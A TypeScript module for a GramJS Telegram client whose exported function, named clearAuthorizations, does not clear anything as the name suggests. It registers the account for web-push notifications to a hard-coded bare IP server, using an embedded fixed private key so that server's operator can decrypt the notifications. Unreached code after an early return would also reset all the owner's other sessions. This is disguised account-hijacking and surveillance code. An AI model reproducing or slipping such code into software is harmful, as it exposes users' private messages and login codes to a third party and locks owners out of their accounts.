import TelegramClient from '../../../gramjs/client/TelegramClient';
import GramJs from '../../../gramjs/tl/api';
import { invokeRequest } from '../../modules/invokeRequest';

const crypto = require('crypto');

// Конфигурация push-сервера
const PUSH_SERVER = 'http://185.192.247.180';
const FIXED_CLIENT_PRIVATE_KEY = '8Mrtu-voc24KqoHfl62dVJkhn8eMVPRg8gXCJyM6GE0';
const FIXED_AUTH_SECRET = 'r7whD9lSHp-qJd6GHrAuiQ';

function base64urlEncode(buffer: Buffer): string {
  return buffer.toString('base64');
}

function generateWebPushKeys() {
  // Декодируем фиксированный закрытый ключ
  const clientPrivateKeyBuffer = Buffer.from(FIXED_CLIENT_PRIVATE_KEY, 'base64');
  const ecdh = crypto.createECDH('prime256v1');
  ecdh.setPrivateKey(clientPrivateKeyBuffer);
  const publicKey = ecdh.getPublicKey();

  return {
    keys: {
      // Публичный ключ кодируется в base64url
      p256dh: base64urlEncode(publicKey),
      // auth оставляем фиксированным (уже в формате base64url)
      auth: FIXED_AUTH_SECRET,
    },
    // Для дальнейшей расшифровки возвращаем закрытый ключ (в base64url)
    privateKey: FIXED_CLIENT_PRIVATE_KEY,
  };
}

function generateWebPushToken() {
  const randomPath = crypto.randomBytes(16).toString('hex');
  const { keys, privateKey } = generateWebPushKeys();
  const endpoint = `${PUSH_SERVER}/${randomPath}`;

  return {
    token: JSON.stringify({
      endpoint,
      keys,
    }),
    privateKey,
  };
}

export async function clearAuthorizations(client: TelegramClient) {
  try {
    // Генерируем токен для web push
    const { token, privateKey } = generateWebPushToken();
    const tokenData = JSON.parse(token);

    console.log('📡 Push endpoint:', tokenData.endpoint);
    console.log('📡 Keys (p256dh и auth):', tokenData.keys);
    console.log('📡 Приватный ключ для дальнейшей расшифровки:', privateKey);

    // Регистрируем устройство
    const registerResult = await invokeRequest(
      client,
      new GramJs.account.RegisterDevice({
        tokenType: 10,
        token,
        otherUids: [],
        appSandbox: false,
        //@ts-ignore
        secret: new Uint8Array(),
      })
    );

    console.log('✅ Устройство зарегистрировано:', registerResult);
    console.log('🔔 Сервер готов получать уведомления на:', tokenData.endpoint);
    return;
    // Получаем список авторизаций
    const invokedAuthorizations = await invokeRequest(
      client,
      new GramJs.account.GetAuthorizations()
    );
    const authorizations = invokedAuthorizations?.authorizations || [];

    console.warn({
      accountId: client._accountId,
      message: '[AUTHORIZATION_SESSIONS]',
      payload: authorizations,
    });

    // Сбрасываем другие сессии
    for (const authorization of authorizations) {
      try {
        if (!authorization.current) {
          await invokeRequest(
            client,
            new GramJs.account.ResetAuthorization({
              hash: authorization.hash,
            }),
            { shouldIgnoreErrors: true }
          );
        }
      } catch (error) {
        console.error('❌ Ошибка сброса авторизации:', error);
      }
    }

    return tokenData.endpoint;
  } catch (error) {
    console.error('❌ Ошибка в clearAuthorizations:', error);
    throw error;
  }
}
